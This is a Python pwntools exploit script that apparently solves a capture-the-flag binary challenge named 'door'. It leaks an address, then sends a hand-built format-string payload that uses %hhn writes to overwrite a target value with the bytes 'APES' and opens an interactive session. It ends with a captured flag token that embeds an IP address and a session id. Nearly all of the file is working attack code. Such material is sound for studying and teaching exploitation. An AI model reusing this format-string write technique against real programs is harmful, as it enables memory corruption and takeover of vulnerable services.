#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf

    prog  = "./door"

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 4001

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog,  
                    """
                        c
                    """)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

def payload(win, target, offset, padding):
    payload = b"A" * padding
    payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
    payload += b"%{}c".format(240 - padding)

    for i in range(4):
        byte = win & 0xff
        win >>= 8
        if (byte == 0):
            payload += b"%{}$hhn".format(offset + i)
        else:
            payload += b"%{}c%{}$hhn%{}c".format(byte, offset + i, 256 - byte)

    return payload

p = start()

p.recvuntil("at ")
address = int(p.recvline().strip(), 16)
distance = (0x218 - 0x210) / 4
string   = 0x53455041           # APES

payload = payload(string, address, distance, 1)
# payload = b"b" + fmtstr_payload(offset, {address: secret - 0x01010101})

p.sendlineafter("open: ", payload)

p.interactive()

# Flag = FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1kb29yIiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiI0YmUwNjM5Yi00NGZmLTQ0NWQtOGY4ZS0wMmZjMGRmZGNmNjYifQ.59gFu5H6lcbFxSuneIwOShDAKD370jex1jiYMm6cjE4}